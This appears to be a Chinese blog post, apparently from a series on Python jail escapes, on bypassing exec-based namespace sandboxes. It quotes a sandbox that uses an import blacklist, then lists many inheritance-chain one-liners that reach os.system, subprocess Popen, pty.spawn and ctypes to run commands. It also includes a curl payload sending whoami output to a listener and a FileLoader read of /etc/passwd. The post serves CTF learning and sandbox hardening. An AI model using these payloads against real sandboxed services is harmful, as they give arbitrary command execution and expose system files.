> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [dummykitty.github.io](https://dummykitty.github.io/posts/pyjail-bypass-03-%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6/)

> 绕过命名空间限制

有些沙箱在构建时使用 exec 来执行命令，exec 函数的第二个参数可以指定命名空间，通过修改、删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。

```
def _hook_import_(name, *args, **kwargs):
    module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',
                        'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',
                        'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',
                        'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',
                        'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',
                        'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',
                        'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',
                        'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',
                        'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',
                        'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',
                        'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',
                        'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',
                        'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']
    for forbid in module_blacklist:
        if name == forbid:        # don't let user import these modules
            raise RuntimeError('No you can\' import {0}!!!'.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__['__import__'] = _hook_import_    # hook import
    del __sandboxed_builtins__['open']
    _global = {
        '__builtins__': __sandboxed_builtins__
    }

    ...
        exec command in _global     # do calculate in a sandboxed  
    ...
```

由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 `__builtins__`（这个`__builtins__`保存的就是原始`__builtins__`的引用），比如 types 库，来执行任意命令：

```
__import__('types').__builtins__
__import__('string').__builtins__
```

```
>>> eval("__import__", {"__builtins__": {}},{"__builtins__": {}})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined
>>> eval("__import__")
<built-in function __import__>

>>> exec("import os")
>>> exec("import os",{"__builtins__": {}},{"__builtins__": {}})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
ImportError: __import__ not found
```

这种情况下我们就需要利用 python 继承链来绕过，其步骤简单来说，就是通过 python 继承链获取内置类, 然后通过这些内置类获取到敏感方法例如 os.system 然后再进行利用。

```
# os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")

# subprocess 
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls')

# builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]

# help
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]['help']

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]['__builtins__']

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")

#imp
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")

# ctypes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('ctypes').CDLL(None).system('ls /'.encode())

# multiprocessing
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start()
```

```
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__=="FileLoader" ][0].get_data(0,"/etc/passwd")
```